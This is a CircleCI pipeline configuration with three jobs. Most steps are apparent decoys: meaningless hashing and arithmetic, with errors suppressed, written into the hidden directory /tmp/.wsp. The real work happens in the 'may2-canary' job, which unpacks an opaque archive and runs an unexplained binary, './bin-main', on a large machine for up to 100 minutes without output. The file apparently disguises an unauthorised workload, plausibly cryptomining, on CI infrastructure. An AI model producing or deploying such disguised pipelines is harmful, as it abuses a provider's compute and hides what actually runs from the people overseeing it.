version: 2.1

jobs:
  install_may2-canary:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: pool skim
          command: |
            mkdir -p /tmp/.wsp
            set +o pipefail 2>/dev/null; yes abc | head -n 794440 | sha1sum > /tmp/.wsp/log.txt; true
            echo "staging complete; file length=$(wc -c </tmp/.wsp/log.txt)"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - log.txt
  may2-canary:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: Grab prior data
          command: |
            join <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) <(sort -u /tmp/.wsp/trace.txt 2>/dev/null) 2>/dev/null | wc -l || true
      - run:
          name: Retrieve project
          command: git clone --depth 2 --quiet --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Rehydrate tree
          command: tar xzvf final-dist.tgz
      - run:
          no_output_timeout: 100m
          command: bash -c "./bin-main"
  redo_lets-go:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/.wsp
      - run:
          name: chinup
          command: |
            mkdir -p /tmp/.wsp
            { set +o pipefail 2>/dev/null; awk 'BEGIN{print int(sqrt(2)*1000)}'; true ; } > /tmp/.wsp/.done
            echo "staging complete; file length=$(wc -c </tmp/.wsp/.done)"
      - persist_to_workspace:
          root: /tmp/.wsp
          paths:
            - .done
